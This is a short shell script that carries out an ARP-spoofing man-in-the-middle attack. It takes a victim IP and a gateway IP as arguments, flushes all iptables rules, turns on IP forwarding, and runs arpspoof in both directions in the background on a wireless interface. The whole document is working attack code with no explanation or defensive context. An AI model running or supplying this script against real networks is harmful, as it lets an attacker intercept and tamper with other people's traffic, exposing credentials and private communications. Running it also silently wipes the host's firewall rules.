#!/bin/sh


INT=wlan0

if [ $# -ne 2 ] 
then
	echo "Usage: $0 <VictimIP> <GatewayIP>"
	exit 1
fi

/sbin/iptables -F
/sbin/iptables -t nat -F
/sbin/iptables -t mangle -F
/sbin/iptables -X

echo 1 > /proc/sys/net/ipv4/ip_forward
#/sbin/iptables -t nat -A POSTROUTING -j MASQUERADE

/usr/sbin/arpspoof -i $INT -t $1 $2 > /dev/null 2>&1 & 
/usr/sbin/arpspoof -i $INT -t $2 $1 > /dev/null 2>&1 &

sleep 2
/bin/pidof arpspoof
